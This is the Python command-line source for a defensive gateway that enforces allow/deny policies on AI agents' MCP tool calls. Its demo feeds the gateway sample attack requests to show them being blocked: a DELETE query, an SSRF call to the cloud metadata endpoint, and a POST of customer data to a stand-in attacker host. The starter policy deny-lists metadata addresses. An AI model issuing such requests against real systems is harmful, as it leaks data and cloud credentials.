"""Agent Policy Gateway CLI — the simplest way to protect any MCP server.

Usage:
    apg proxy --target http://localhost:9000 --policy policy.json
    apg proxy --target http://localhost:9000  # uses default deny-all policy
    apg demo   # runs a built-in demo showing allow/deny

That's it. One command, your MCP server is now policy-protected.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import sys
import time
from pathlib import Path
from typing import Any


def main():
    parser = argparse.ArgumentParser(
        prog="apg",
        description="Zero Trust Policy Gateway for AI Agents",
    )
    subparsers = parser.add_subparsers(dest="command")

    # --- proxy command ---
    proxy_parser = subparsers.add_parser(
        "proxy",
        help="Start Agent Policy Gateway as a transparent proxy in front of any MCP server",
    )
    proxy_parser.add_argument(
        "--target",
        required=True,
        help="URL of the MCP server to protect (e.g., http://localhost:9000)",
    )
    proxy_parser.add_argument(
        "--policy",
        default="policy.json",
        help="Path to policy.json (default: ./policy.json)",
    )
    proxy_parser.add_argument(
        "--port",
        type=int,
        default=8000,
        help="Port for Agent Policy Gateway to listen on (default: 8000)",
    )
    proxy_parser.add_argument(
        "--token",
        default=None,
        help="Agent bearer token (default: from APG_AGENT_TOKEN env var)",
    )
    proxy_parser.add_argument(
        "--audit-file",
        default="apg-audit.jsonl",
        help="Audit log file path (default: apg-audit.jsonl)",
    )
    proxy_parser.add_argument(
        "--mode",
        choices=["enforce", "audit"],
        default="enforce",
        help="enforce=block denied requests, audit=log but allow all (default: enforce)",
    )

    # --- wrap command (stdio transport) ---
    wrap_parser = subparsers.add_parser(
        "wrap",
        help="Wrap a stdio MCP server: apg wrap --policy policy.json -- npx some-mcp-server",
    )
    wrap_parser.add_argument(
        "--policy",
        default="policy.json",
        help="Path to policy.json (default: ./policy.json)",
    )
    wrap_parser.add_argument(
        "--audit-file",
        default="apg-audit.jsonl",
        help="Audit log file path (default: apg-audit.jsonl)",
    )
    wrap_parser.add_argument(
        "--mode",
        choices=["enforce", "audit"],
        default="enforce",
        help="enforce=block denied calls, audit=log but allow all (default: enforce)",
    )
    wrap_parser.add_argument(
        "server_command",
        nargs=argparse.REMAINDER,
        help="-- followed by the command that starts the MCP server",
    )

    # --- demo command ---
    subparsers.add_parser(
        "demo",
        help="Run an interactive demo showing Agent Policy Gateway enforcement",
    )

    # --- policy command (validate | suggest | test) ---
    policy_parser = subparsers.add_parser(
        "policy",
        help="Policy tooling: validate, suggest (learning mode), test",
    )
    policy_sub = policy_parser.add_subparsers(dest="policy_action")

    validate_parser = policy_sub.add_parser(
        "validate",
        help="Check a policy file loads, validates, and is default-deny",
    )
    validate_parser.add_argument(
        "path",
        nargs="?",
        default="policy.json",
        help="Path to the policy file (default: ./policy.json)",
    )

    suggest_parser = policy_sub.add_parser(
        "suggest",
        help="Learning mode: read an audit log and propose allowlist entries",
    )
    suggest_parser.add_argument(
        "--audit-file",
        default="apg-audit.jsonl",
        help="Audit log to analyze (default: ./apg-audit.jsonl)",
    )
    suggest_parser.add_argument(
        "--policy",
        default="policy.json",
        help="Current policy to diff suggestions against (default: ./policy.json)",
    )

    test_parser = policy_sub.add_parser(
        "test",
        help="Run allow/deny assertions (YAML) against a policy",
    )
    test_parser.add_argument("testfile", help="Path to the YAML test file")
    test_parser.add_argument(
        "--policy",
        default="policy.json",
        help="Policy to test (default: ./policy.json)",
    )

    # --- audit command (tail) ---
    audit_parser = subparsers.add_parser(
        "audit",
        help="Inspect the audit trail",
    )
    audit_sub = audit_parser.add_subparsers(dest="audit_action")
    tail_parser = audit_sub.add_parser(
        "tail",
        help="Show recent audit events (JSONL or SQLite)",
    )
    tail_parser.add_argument(
        "--audit-file",
        default="apg-audit.jsonl",
        help="Audit target: a .jsonl file or a sqlite .db (default: ./apg-audit.jsonl)",
    )
    tail_parser.add_argument(
        "--limit",
        type=int,
        default=20,
        help="Number of most-recent events to show (default: 20)",
    )
    tail_parser.add_argument(
        "--outcome",
        default=None,
        help="Filter by outcome, e.g. DENY, ALLOW, PASS_THROUGH",
    )
    tail_parser.add_argument(
        "--follow",
        "-f",
        action="store_true",
        help="Keep watching and print new events as they arrive",
    )

    # --- hash-password command ---
    hash_parser = subparsers.add_parser(
        "hash-password",
        help="Generate an argon2 hash for APG_OPERATOR_PASSWORD_HASH",
    )
    hash_parser.add_argument(
        "password",
        nargs="?",
        help="Password to hash (omit to be prompted without echo)",
    )

    # --- init command ---
    init_parser = subparsers.add_parser(
        "init",
        help="Generate a starter policy.json file",
    )
    init_parser.add_argument(
        "--output",
        default="policy.json",
        help="Output path (default: ./policy.json)",
    )

    args = parser.parse_args()

    if args.command == "proxy":
        _run_proxy(args)
    elif args.command == "wrap":
        _run_wrap(args)
    elif args.command == "demo":
        _run_demo()
    elif args.command == "init":
        _run_init(args)
    elif args.command == "policy":
        _run_policy(args)
    elif args.command == "audit":
        _run_audit(args)
    elif args.command == "hash-password":
        _run_hash_password(args)
    else:
        parser.print_help()
        sys.exit(1)


def _run_policy(args):
    """Dispatch policy tooling: validate | suggest | test."""
    action = getattr(args, "policy_action", None)
    if action == "validate":
        _run_policy_validate(args)
    elif action == "suggest":
        _run_policy_suggest(args)
    elif action == "test":
        _run_policy_test(args)
    else:
        print("Usage: apg policy {validate|suggest|test} ...", file=sys.stderr)
        sys.exit(1)


def _run_policy_validate(args):
    """Check a policy file loads, validates, and is default-deny."""
    from agent_policy_gateway.core.policy import PolicyLoadError, load_policy_document

    try:
        policy = load_policy_document(args.path)
    except PolicyLoadError as exc:
        print(f"INVALID: {exc}", file=sys.stderr)
        sys.exit(1)

    print(f"OK: {args.path}")
    print(f"  version:  {policy.version}")
    print(f"  default:  {policy.default}")
    print(f"  tools:    {len(policy.tools)} ({', '.join(sorted(policy.tools))})")
    for name, tool in sorted(policy.tools.items()):
        status = "allow" if tool.allow else "deny"
        print(f"    - {name}: {status}")
    if policy.agents:
        print(f"  agents:   {len(policy.agents)}")
        for agent_id, agent in sorted(policy.agents.items()):
            scope = "all tools" if "*" in agent.tools else ", ".join(agent.tools)
            print(f"    - {agent_id} (token: ${agent.token_env}): {scope}")


def _run_policy_suggest(args):
    """Learning mode: mine an audit log for denied calls and propose entries."""
    from agent_policy_gateway.core.learning import load_audit_events, suggest_entries
    from agent_policy_gateway.core.policy import PolicyLoadError, load_policy_document

    events = load_audit_events(args.audit_file)
    if not events:
        print(f"No audit events found in {args.audit_file}", file=sys.stderr)
        print(
            "Run the proxy in audit mode first: "
            "apg proxy --mode audit --target ... --policy ...",
            file=sys.stderr,
        )
        sys.exit(1)

    policy = None
    if Path(args.policy).exists():
        try:
            policy = load_policy_document(args.policy)
        except PolicyLoadError as exc:
            print(
                f"WARNING: could not load current policy ({exc}); "
                "suggesting from scratch",
                file=sys.stderr,
            )

    suggestions = suggest_entries(events, policy)
    if not suggestions:
        print(
            "No new allowlist entries needed — every observed call is already "
            "permitted by the policy.",
            file=sys.stderr,
        )
        return

    print(
        f"# Suggested additions for {args.policy} "
        f"(from {len(events)} audit events)",
        file=sys.stderr,
    )
    print('# Review, then merge into the "tools" object of your policy.', file=sys.stderr)
    print(json.dumps({"tools": suggestions}, indent=2))


def _run_policy_test(args):
    """Run YAML allow/deny assertions against a policy through the real engine."""
    from agent_policy_gateway.core.policy_test import (
        PolicyTestError,
        load_cases,
        run_cases,
    )
    from agent_policy_gateway.proxy_app import build_evaluator

    try:
        cases = load_cases(args.testfile)
    except PolicyTestError as exc:
        print(f"ERROR: {exc}", file=sys.stderr)
        sys.exit(2)

    if not Path(args.policy).exists():
        print(
            f"WARNING: policy file not found ({args.policy}); "
            "testing against default deny-all",
            file=sys.stderr,
        )

    evaluator = build_evaluator(args.policy)
    results = run_cases(cases, evaluator)

    passed = 0
    for result in results:
        icon = "PASS" if result.passed else "FAIL"
        print(f"  [{icon}] {result.name}  (expected {result.expected}, got {result.actual})")
        if not result.passed and result.reason:
            print(f"         reason: {result.reason}")
        passed += 1 if result.passed else 0

    total = len(results)
    print()
    print(f"{passed}/{total} cases passed")
    if passed != total:
        sys.exit(1)


def _run_proxy(args):
    """Start the transparent MCP proxy."""
    # Set token
    if args.token:
        os.environ["APG_AGENT_TOKEN"] = args.token
    elif not os.environ.get("APG_AGENT_TOKEN"):
        # Generate a random token for easy local testing
        token = hashlib.sha256(str(time.time()).encode()).hexdigest()[:32]
        os.environ["APG_AGENT_TOKEN"] = token
        print(f"  Generated token: {token}")
        print(f"  Set APG_AGENT_TOKEN={token} in your agent's env")
        print()

    # Check policy file
    policy_path = Path(args.policy)
    if not policy_path.exists():
        print(f"  Policy file not found: {args.policy}")
        print("  Run 'apg init' to generate a starter policy")
        print("  Or Agent Policy Gateway will use default deny-all policy")
        print()

    os.environ["APG_TARGET_URL"] = args.target
    os.environ["APG_AUDIT_FILE"] = args.audit_file
    os.environ["APG_MODE"] = args.mode

    print("┌───────────────────────────────────────────────────┐")
    print("│           Agent Policy Gateway                     │")
    print("├───────────────────────────────────────────────────┤")
    print(f"│  Listening:  http://0.0.0.0:{args.port:<23}│")
    print(f"│  Target:     {args.target:<36}│")
    print(f"│  Policy:     {args.policy:<36}│")
    print(f"│  Mode:       {args.mode:<36}│")
    print(f"│  Audit log:  {args.audit_file:<36}│")
    print("├───────────────────────────────────────────────────┤")
    print("│  Point your MCP client here instead of the        │")
    print("│  target. APG will enforce policy on every          │")
    print("│  tools/call request.                               │")
    print("└───────────────────────────────────────────────────┘")
    print()

    import uvicorn

    from agent_policy_gateway.proxy_app import create_proxy_app

    app = create_proxy_app(
        target_url=args.target,
        policy_path=str(policy_path) if policy_path.exists() else None,
        audit_file=args.audit_file,
        mode=args.mode,
    )
    uvicorn.run(app, host="0.0.0.0", port=args.port, log_level="info")


def _run_wrap(args):
    """Wrap a stdio MCP server subprocess with policy enforcement."""
    from agent_policy_gateway.adapters.transports.stdio import wrap
    from agent_policy_gateway.proxy_app import build_evaluator

    command = list(args.server_command)
    # argparse REMAINDER keeps the leading "--"; drop it.
    if command and command[0] == "--":
        command = command[1:]
    if not command:
        print(
            "ERROR: no server command given.\n"
            "Usage: apg wrap --policy policy.json -- npx some-mcp-server",
            file=sys.stderr,
        )
        sys.exit(2)

    policy_path = args.policy if Path(args.policy).exists() else None
    if policy_path is None:
        print(
            f"WARNING: policy file not found ({args.policy}); using default deny-all",
            file=sys.stderr,
        )
    evaluator = build_evaluator(policy_path)

    # stdout is the JSON-RPC channel — every human-facing line goes to stderr.
    print(f"apg: wrapping stdio MCP server: {' '.join(command)}", file=sys.stderr)
    print(
        f"apg: policy={args.policy} mode={args.mode} audit={args.audit_file}",
        file=sys.stderr,
    )

    exit_code = wrap(command, evaluator, audit_file=args.audit_file, mode=args.mode)
    sys.exit(exit_code)


def _format_audit_event(event: dict) -> str:
    """Render one audit event as a compact, aligned line."""
    timestamp = event.get("timestamp", "-")
    outcome = event.get("outcome", "-")
    method = event.get("method") or "-"
    latency = event.get("latency_ms")
    latency_str = f"{latency}ms" if latency is not None else ""
    reason = event.get("reason") or ""
    return f"{timestamp}  {outcome:<12}  {method:<14}  {latency_str:<9}  {reason}"


def _run_audit(args):
    """Inspect the audit trail: currently `audit tail`."""
    if getattr(args, "audit_action", None) != "tail":
        print(
            "Usage: apg audit tail [--audit-file ...] [--limit N] "
            "[--outcome DENY] [--follow]",
            file=sys.stderr,
        )
        sys.exit(1)

    from agent_policy_gateway.adapters.audit import build_audit_sink

    sink = build_audit_sink(args.audit_file)
    try:
        for event in sink.read(limit=args.limit, outcome=args.outcome):
            print(_format_audit_event(event))

        if args.follow:
            print("-- watching for new events (Ctrl-C to stop) --", file=sys.stderr)
            baseline = len(sink.read(outcome=args.outcome))
            try:
                while True:
                    time.sleep(1.0)
                    events = sink.read(outcome=args.outcome)
                    for event in events[baseline:]:
                        print(_format_audit_event(event), flush=True)
                    baseline = len(events)
            except KeyboardInterrupt:
                pass
    finally:
        sink.close()


def _run_demo():
    """Run an interactive demo."""
    print("┌───────────────────────────────────────────────────┐")
    print("│         Agent Policy Gateway — Live Demo           │")
    print("└───────────────────────────────────────────────────┘")
    print()
    print("This simulates an AI agent making requests through Agent Policy Gateway.")
    print()

    # Inline demo — no server needed
    from agent_policy_gateway.proxy_app import evaluate_request

    scenarios: list[dict[str, Any]] = [
        {
            "name": "Valid SELECT Query",
            "method": "db.query",
            "params": {"query": "SELECT name, email FROM customers WHERE active=1"},
        },
        {
            "name": "DELETE Attempt",
            "method": "db.query",
            "params": {"query": "DELETE FROM customers WHERE id=42"},
        },
        {
            "name": "SSRF — Cloud Metadata",
            "method": "http.get",
            "params": {"url": "http://169.254.169.254/latest/meta-data/"},
        },
        {
            "name": "Data Exfiltration",
            "method": "http.post",
            "params": {"url": "https://evil.attacker.com/steal", "body": "customer data"},
        },
    ]

    for i, s in enumerate(scenarios, 1):
        result = evaluate_request(s["method"], s["params"])
        icon = "✓" if result["allowed"] else "✗"
        color_start = "\033[92m" if result["allowed"] else "\033[91m"
        color_end = "\033[0m"
        print(f"  {i}. {s['name']}")
        print(f"     Action: {s['method']}({json.dumps(s['params'])})")
        print(f"     Result: {color_start}{icon} {result['outcome']}{color_end}")
        if result.get("reason"):
            print(f"     Reason: {result['reason']}")
        print()

    print("─────────────────────────────────────────────")
    print("Agent Policy Gateway blocked 3/4 requests. The one allowed request")
    print("would have sensitive fields (SSN, passwords) redacted")
    print("from the response before returning to the agent.")


def _run_hash_password(args):
    """Print an argon2 hash for use as APG_OPERATOR_PASSWORD_HASH."""
    try:
        from argon2 import PasswordHasher
    except ImportError:
        print(
            "ERROR: argon2 is not installed. Install the server extra:\n"
            '  pip install "agent-policy-gateway[server]"',
            file=sys.stderr,
        )
        sys.exit(1)

    password = args.password
    if not password:
        import getpass

        password = getpass.getpass("Password: ")
    if not password:
        print("ERROR: empty password", file=sys.stderr)
        sys.exit(2)

    print(PasswordHasher().hash(password))


def _run_init(args):
    """Generate a starter policy.json."""
    policy = {
        "version": 1,
        "default": "deny",
        "credential_broker": "none",
        "caller_auth": {"method": "shared_token", "token_env": "APG_AGENT_TOKEN"},
        "session_limits": {
            "max_calls_per_session": 200,
            "max_records_per_session": 5000,
        },
        "tools": {
            "db.query": {
                "allow": True,
                "operations": ["select"],
                "tables": [],
                "sql": {"dialect": "", "params": ["query", "sql"]},
                "constraints": {"limit": {"max": 100}},
            },
            "http.get": {
                "allow": True,
                "operations": ["GET"],
                "destination_whitelist": ["https://api.yourcompany.com"],
                "deny_destinations": ["169.254.169.254", "metadata.google.internal"],
            },
        },
    }

    output_path = Path(args.output)
    output_path.write_text(json.dumps(policy, indent=2))
    print(f"Created {output_path}")
    print()
    print("Edit this file to configure which tools and operations are allowed.")
    print("Then run:")
    print(f"  apg proxy --target http://your-mcp-server:9000 --policy {output_path}")


if __name__ == "__main__":
    main()
